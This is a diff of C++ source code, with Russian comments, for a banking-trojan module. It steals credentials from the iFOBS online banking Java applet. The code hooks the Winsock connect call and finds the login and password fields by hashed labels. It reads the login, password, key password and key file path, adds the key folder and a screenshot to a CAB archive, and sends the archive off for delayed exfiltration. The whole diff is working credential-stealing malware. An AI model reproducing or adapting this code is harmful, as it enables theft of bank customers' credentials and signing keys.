@@ -15,10 +15,32 @@
 #include "StrConsts.h"
 #include "Splice.h"
 #include "ScreenShots.h"
+#include "WndUtils.h"
 //---------------------------------------------------------------------------
 
 
+#include "BotDebug.h"
+
+namespace IFOBSONLINEEBUGSTRINGS
+{
+	#include "DbgTemplates.h"
+}
+
+// Объявляем шаблон вывода отладочных строк
+#define IFODBG IFOBSONLINEEBUGSTRINGS::DBGOutMessage<>
+
+
 HWND SearchJavaAppletWindow();
+
+
+const static DWORD IFOLoginHashes[] = {0xBDD8F46C /* логин */,
+									   0xBDD8D9EC /* логін */,
+									   0xCDF9F4E8 /* login */,
+									   0};
+
+const static DWORD IFOPasswordHashes[] = {0xF1E44A82 /* пароль */,
+										  0x3E1A7EFB /* password */,
+										  0};
 
 
 //==========================================================
@@ -27,6 +49,8 @@ HWND SearchJavaAppletWindow();
 namespace IfobsOnline
 {
 	DWORD PID = 0;        // Пид процесса, в котором работает грабер
+	TIfobsOnlineGrabber *Grabber = NULL;
+
 	HWND  AppletWnd = 0;  // Идентификатор окна аплета
 
 	// Определяем типы для установки хуков
@@ -43,37 +67,65 @@ namespace IfobsOnline
 		if (!IsWindowVisible(AppletWnd))
 			AppletWnd = NULL;
 
-		if (AppletWnd == NULL)
+		if (Grabber)
 		{
-			TIfobsOnline Grabber;
-			Grabber.SendLog();
+			if (Grabber->SendLog())
+			{
+				delete Grabber;
+				Grabber = NULL;
+            }
 		}
 		return Real_Connect(s, name, namelen);
 	}
 
 
+
+
 	//*****************************************************
 	//  Initialize - Функия инициализирует грабер
 	//*****************************************************
-	bool Initialize()
+	bool Initialize(HWND JafaFrameWnd, const char* URL)
 	{
 		// проверяем текущий процесс
 		if (IsNewProcess(PID))
 		{
 			Real_Connect = NULL;
-			AppletWnd    = NULL;
+			Grabber      = NULL;
 		}
+
+
+		// Закрываем старый грабер
+		if (Grabber)
+		{
+			delete Grabber;
+			Grabber = NULL;
+        }
+
+		// Создаём новый грабер
+		Grabber = new TIfobsOnlineGrabber(JafaFrameWnd);
+
+		if (!Grabber->IsIfobs())
+		{
+			// Окно не является окном ИФобс
+			delete Grabber;
+			Grabber = NULL;
+			return false;
+        }
+
+        IFODBG("IfobsOnline", "Стартуем IfobOnline [URL: %s]", URL);
+
 
 		// Проверяем на предмет уже установленных хуков
-		if (Real_Connect) return true;
-
-
-		// Устанавливаем хуки
-		if ( HookApi( DLL_WINSOCK, 0xEDD8FE8A /* connect */, &Hook_Connect ) )
+		if (!Real_Connect)
 		{
-			__asm mov [Real_Connect], eax
-		}
+			// Устанавливаем хуки
+			if ( HookApi( DLL_WINSOCK, 0xEDD8FE8A /* connect */, &Hook_Connect ) )
+			{
+				__asm mov [Real_Connect], eax
+			}
+        }
 
+		return true;
 	}
     //---------------------------------------------------------------------------
 }
@@ -82,136 +134,167 @@ namespace IfobsOnline
 //==========================================================
 
 
+//******************************************************
+//  Класс идентификации Ифобс банка по схеме окон
+//******************************************************
 
 
-
-//---------------------------------------------------------------------------
-TIfobsOnline::TIfobsOnline()
-	: TKeyLogger()
+int CALLBACK TIfobsOnlineGrabberEnumWnd(HWND Wnd, LPARAM Param)
 {
-
-}
-//----------------------------------------------------------------------------
-
-
-BOOL CALLBACK JavaAppletSearchWnd(HWND Wnd, LPARAM Data)
-{
-	const static DWORD WndHash = 0x7C3C1E9A /* sunawtcanvas */;
-
-	HWND* Result = (HWND*)Data;
-
-	if (GetWndClassHash(Wnd, true) == WndHash)
-		*Result = Wnd;
-
-	if (*Result == NULL)
-    	pEnumChildWindows(Wnd, JavaAppletSearchWnd, Data);
-
-	return *Result == NULL;
-}
-
-
-//-----------------------------------------------------
-//  SearchJavaAppletWindow - Функция ищет главное окно
-//                           ява аплета
-//-----------------------------------------------------
-HWND SearchJavaAppletWindow()
-{
-	// В основе алгоритма будет перебор всех окон процесса
-
-	//SunAwtFrame
-	HWND Wnd = NULL;
-
-	pEnumChildWindows(0, JavaAppletSearchWnd, (LPARAM)&Wnd);
-
-	return Wnd;
-}
-//----------------------------------------------------------------------------
-
-
-BOOL CALLBACK IfobsOnlineEnumWndProc(HWND Wnd, LPARAM Data)
-{
-	TIfobsOnline* Client = (TIfobsOnline*)Data;
-
-	Client->AddWndData(Wnd);
-
-	pEnumChildWindows(Wnd, IfobsOnlineEnumWndProc, Data);
-
+	// Обрабатываем окно
+    ((TIfobsOnlineGrabber*)Param)->CheckWindow(Wnd);
+	pEnumChildWindows(Wnd, TIfobsOnlineGrabberEnumWnd, Param);
 	return TRUE;
 }
+//-----------------------------------------------------------------------------
 
 
-
-//-----------------------------------------------------
-//  BindData - Функция запускает перебор окон для сбора
-//             необъодимых данных
-//-----------------------------------------------------
-bool TIfobsOnline::BindData()
+TIfobsOnlineGrabber::TIfobsOnlineGrabber(HWND SunAwtFrameWnd)
 {
-	IfobsOnline::AppletWnd = SearchJavaAppletWindow();
-    bool Result = false;
-	if (IfobsOnline::AppletWnd)
-	{
-		pEnumChildWindows(IfobsOnline::AppletWnd, IfobsOnlineEnumWndProc, (LPARAM)this);
+	FSunAwtFrameWnd = SunAwtFrameWnd;
+	FIsIfobs = false;
+	Captions = 0;
+	HWND CanvasWnd = GetSunAwtCanvasWnd(SunAwtFrameWnd);
+	if (!CanvasWnd) return;
 
-		Result = !FLogin.IsEmpty() && !FPassword.IsEmpty();
+	pEnumChildWindows(CanvasWnd, TIfobsOnlineGrabberEnumWnd, (LPARAM)this);
 
-		if (Result)
-		{
-//			string S;
-//			S.Format("Login: %s\nPassword: %s\nKeyPass: %s\nKeyPah: %s", FLogin.t_str(), FPassword.t_str(), FKeyPassword.t_str(), FKeyFilePath.t_str());
-//			pOutputDebugStringA(S.t_str());
-        }
-	}
-	return Result;
+    FIsIfobs = CheckScheme();
 }
-//----------------------------------------------------------------------------
+//-----------------------------------------------------------------------------
 
-void TIfobsOnline::AddWndData(HWND Wnd)
+void TIfobsOnlineGrabber::InsertWnd(HWND Wnd, TBotList &L)
 {
-	DWORD Class = GetWndClassHash(Wnd, true);
-	if (Class == 0xCB934F4 /* edit */)
-	{
-		LONG ID = (LONG)pGetWindowLongA(Wnd, GWL_ID);
-		if (ID >= 1 && ID <= 4)
-		{
-			string Text = GetWndText2(Wnd);
-			switch (ID) {
-				case 1: FLogin       = Text; break;
-				case 2: FPassword    = Text; break;
-				case 3: FKeyPassword = Text; break;
-				case 4: FKeyFilePath = Text; break;
-			}
-        }
-	}
+	if (L.IndexOf(Wnd) < 0) L.Add(Wnd);
 }
-//----------------------------------------------------------------------------
+//-----------------------------------------------------------------------------
 
-//-----------------------------------------------------
-//  PackData - Функция запаковывает данные в каб архив
-//             В случае успеха возвращает путь к каб
-//             файлу
-//-----------------------------------------------------
-string TIfobsOnline::PackData()
+//---------------------------------------------------
+//  Добавляем окно в схему
+//---------------------------------------------------
+void TIfobsOnlineGrabber::CheckWindow(HWND Wnd)
 {
-	string CABName;
-
-	CABName = "c:\\ifobs.cab";//File::GetTempName2A();
-	HCAB Cab = CreateCab(CABName.t_str());
-
-	if (Cab)
+	// Проверяем редактор ввода
+	if (IsJavaEditWindow(Wnd))
+		InsertWnd(Wnd, FEdits);
+	else
+	if (IsJavaLabelWindow(Wnd))
 	{
-		// Упаковываем логин и пароли
+		// Привязываемся к некоторым надписям окна
+		if (SameWndTextWithHashArray(Wnd, &IFOLoginHashes[0], true))
+			Captions |= 1;
+		else
+		if (SameWndTextWithHashArray(Wnd, &IFOPasswordHashes[0], true))
+			Captions |= 2;
+    }
+
+}
+
+//---------------------------------------------------
+//  Функция возвращает окно по его идентификатору
+//---------------------------------------------------
+HWND TIfobsOnlineGrabber::GetEditByID(LONG ID)
+{
+	for (int i = 0; i < FEdits.Count(); i++)
+	{
+		HWND Wnd = (HWND)FEdits.GetItem(i);
+        LONG WNDID = (LONG)pGetWindowLongA(Wnd, GWL_ID);
+		if (WNDID == ID) return Wnd;
+	}
+	return NULL;
+}
+
+
+//---------------------------------------------------
+// Функция проверяет схему
+//---------------------------------------------------
+bool TIfobsOnlineGrabber::CheckScheme()
+{
+
+	// Функция вернёт истину если во фрейме 4 едита
+	// две кнопки с нужными надписями
+	if (FEdits.Count() != 4)
+		return false;
+
+	// Проверяем все найденные надписи
+	if (Captions != 3) return false;
+
+
+	LoginWnd       = GetEditByID(1);
+	PasswordWnd    = GetEditByID(2);
+	KeyPasswordWnd = GetEditByID(3);
+	KeyPathWnd     = GetEditByID(4);
+}
+
+//---------------------------------------------------
+// Функция упаковывает текстовые данные
+//---------------------------------------------------
+string TIfobsOnlineGrabber::PackTextData()
+{
+	FLogin       = GetWndText2(LoginWnd);
+	FPassword    = GetWndText2(PasswordWnd);
+	FKeyPassword = GetWndText2(KeyPasswordWnd);
+	FKeyFilePath = GetWndText2(KeyPathWnd);
+
+	string Result;
+
+	if (!FLogin.IsEmpty() && !FPassword.IsEmpty())
+	{
 		TBotStrings Fields;
 		Fields.ValueDelimeter = ": ";
+        Fields.AddValue("URL", GetURLFromJavaProcess());
 		Fields.AddValue("Login", FLogin);
 		Fields.AddValue("Password", FPassword);
 		Fields.AddValue("KeyPassword", FKeyPassword);
 
-		AddStringToCab(Cab, Fields.GetText(), "Log.txt");
+		Result = Fields.GetText();
+	}
+
+	return Result;
+}
+
+
+//-----------------------------------------------------
+//  AddFilewsToCab - Функия добавляет папку ключей в
+//                   архив
+//-----------------------------------------------------
+void TIfobsOnlineGrabber::AddFilesToCab(LPVOID Cab)
+{
+	if (!DirExists(FKeyFilePath.t_str())) return;
+
+	IFODBG("IfobsOnline", "Добавляем ключи в архив: %s", FKeyFilePath.t_str());
+
+	// Проверяем максимальный размер папки с ключами
+	if (SizeFolderLess(FKeyFilePath.t_str(), IFOBS_MAX_KEY_PATH_SIZE, NULL))
+		AddDirToCab(Cab, FKeyFilePath.t_str(), "Keys");
+}
+//----------------------------------------------------------------------------
+
+
+//-----------------------------------------------------
+//  SendLog - Функия собирает лог
+//-----------------------------------------------------
+BOOL TIfobsOnlineGrabber::SendLog()
+{
+	if (!FIsIfobs) return FALSE;
+
+	string Log = PackTextData();
+	if (Log.IsEmpty()) return FALSE;
+
+    IFODBG("IfobsOnline", "Получен лог IFobsOnline: \r\n%s", Log.t_str());
+
+	BOOL Result = FALSE;
+
+	string CABName = "c:\\ifobs.cab";//File::GetTempName2A();
+	HCAB Cab = CreateCab(CABName.t_str());
+	if (Cab)
+	{
+		// Упаковываем логин и пароли
+		AddStringToCab(Cab, Log, "Log.txt");
 
 		// Добавляем скриншот
 		string Screen = File::GetTempName2A();
-		bool AddScreen = ScreenShot::Make(0, 0, 0, 0, 0, NULL, Screen.t_str());
+		bool AddScreen = ScreenShot::Make(GetTopParentWindow(FSunAwtFrameWnd), 0, 0, 0, 0, NULL, Screen.t_str());
 		if (AddScreen)
 			AddFileToCab(Cab, Screen.t_str(), "Screen.png");
 		pDeleteFileA(Screen.t_str());
@@ -221,40 +304,16 @@ string TIfobsOnline::PackData()
 
 		// Закрываем арив
 		CloseCab(Cab);
+
+		// Отправляем лог
+		DataGrabber::SendCabDelayed(NULL, CABName.t_str(), GetStr(EStrSystemIfobsOnline).t_str());
+
+		Result = TRUE;
 	}
 
-	return CABName;
-}
-//----------------------------------------------------------------------------
+	pDeleteFileA(CABName.t_str());
 
-//-----------------------------------------------------
-//  AddFilewsToCab - Функия добавляет папку ключей в
-//                   архив
-//-----------------------------------------------------
-void TIfobsOnline::AddFilesToCab(LPVOID Cab)
-{
-	if (!DirExists(FKeyFilePath.t_str())) return;
-
-    // Проверяем максимальный размер папки с ключами
-	if (SizeFolderLess(FKeyFilePath.t_str(), IFOBS_MAX_KEY_PATH_SIZE, NULL))
-		AddDirToCab(Cab, FKeyFilePath.t_str(), "Keys");
-}
-//----------------------------------------------------------------------------
-
-//-----------------------------------------------------
-//  SendLog - Функия собирает лог
-//-----------------------------------------------------
-void TIfobsOnline::SendLog()
-{
-	if (BindData())
-	{
-		string Cab = PackData();
-		if (!Cab.IsEmpty())
-		{
-			DataGrabber::SendCabDelayed(NULL, Cab.t_str(), GetStr(EStrSystemIfobsOnline).t_str());
-			//spDeleteFileA(Cab.t_str());
-		}
-    }
+	return Result;
 }
 //----------------------------------------------------------------------------
 
